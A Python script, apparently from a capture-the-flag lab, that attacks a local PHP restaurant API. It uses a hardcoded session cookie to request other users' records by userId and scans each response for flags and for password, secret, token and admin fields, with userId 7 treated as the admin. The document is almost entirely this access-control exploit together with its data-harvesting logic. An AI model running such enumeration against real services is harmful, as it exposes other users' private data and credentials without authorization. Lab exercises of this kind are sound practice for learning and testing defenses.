import requests
import json
import re
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

BASE_URL = "http://127.0.0.1:33156"
API_ENDPOINT = "/api/get_favorite_restaurants.php"
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}

def create_robust_session():
    """Create a session with retry logic and connection limits"""
    session = requests.Session()
    session.cookies.update(cookie)
    
    # Disable keep-alive to prevent broken pipe issues
    session.headers.update({"Connection": "close"})
    
    # Configure retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        method_whitelist=["GET"]
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=1, pool_maxsize=1)
    session.mount("http://", adapter)
    
    return session

def extract_flags_and_sensitive(data_text):
    """Extract flags and search for sensitive data"""
    results = {}
    
    # Find flags
    flags = re.findall(r'FLAG\{[^}]+\}', data_text)
    if flags:
        results['flags'] = flags
    
    # Try to parse JSON
    try:
        data = json.loads(data_text)
        results['json'] = data
        
        # Look for sensitive fields
        keywords = ['password','hint','secret','token','admin','role','privilege']
        sensitive = []
        
        def scan_dict(d, path=""):
            if isinstance(d, dict):
                for key, value in d.items():
                    current_path = f"{path}.{key}" if path else key
                    for kw in keywords:
                        if kw in key.lower():
                            sensitive.append({'field': current_path, 'value': value})
                    if isinstance(value, (dict, list)):
                        scan_dict(value, current_path)
            elif isinstance(d, list):
                for idx, item in enumerate(d):
                    scan_dict(item, f"{path}[{idx}]")
        
        scan_dict(data)
        if sensitive:
            results['sensitive'] = sensitive
            
    except json.JSONDecodeError:
        pass
    
    return results

# Main enumeration
flags_found = []
admin_data = None
all_sensitive = []
successful_requests = 0
failed_requests = 0

print("[BEGINNING API ENUMERATION]")
print(f"Target: {BASE_URL}{API_ENDPOINT}")
print(f"Testing userIds: 1-20")
print("-" * 50)

try:
    session = create_robust_session()
    
    for user_id in range(1, 21):
        try:
            url = f"{BASE_URL}{API_ENDPOINT}?userId={user_id}"
            
            # Add small delay every 5 requests
            if user_id % 5 == 0 and user_id > 1:
                time.sleep(0.5)
            
            resp = session.get(url, timeout=10)
            analysis = extract_flags_and_sensitive(resp.text)
            
            # Process flags
            if 'flags' in analysis:
                for flag in analysis['flags']:
                    flags_found.append({'user_id': user_id, 'flag': flag})
            
            # Process admin (userId=7)
            if user_id == 7 and 'json' in analysis:
                admin_data = analysis['json']
                if 'sensitive' in analysis:
                    all_sensitive.extend([{'user_id': user_id, 'data': s} for s in analysis['sensitive']])
            
            # Process sensitive data
            if 'sensitive' in analysis and user_id != 7:
                all_sensitive.extend([{'user_id': user_id, 'data': s} for s in analysis['sensitive']])
            
            successful_requests += 1
            print(f"userId={user_id:2d}: status={resp.status_code} size={len(resp.text)}B flags={len(analysis.get('flags', []))}")
            
        except Exception as e:
            failed_requests += 1
            print(f"userId={user_id:2d}: ERROR - {str(e)}")
    
    # Close session
    session.close()
    
    # Final report
    print("\n" + "=" * 50)
    print("FINAL REPORT")
    print("=" * 50)
    
    print(f"\nFLAGS FOUND: {len(flags_found)}")
    for item in flags_found:
        print(f"  User {item['user_id']}: {item['flag']}")
    
    print(f"\nADMIN DATA (userId=7): {'FOUND' if admin_data else 'NOT FOUND'}")
    if admin_data:
        print(json.dumps(admin_data, indent=2))
    
    print(f"\nSENSITIVE FIELDS: {len(all_sensitive)}")
    for item in all_sensitive:
        print(f"  User {item['user_id']}: {item['data']['field']}={str(item['data']['value'])}")
    
    print(f"\nREQUEST STATS: {successful_requests} successful, {failed_requests} failed")
    
    if not flags_found:
        print("\n[NOTICE] No FLAG{} patterns were found in the responses")
    
except Exception as main_error:
    print(f"Critical error: {str(main_error)}")
    print("Unable to complete enumeration")
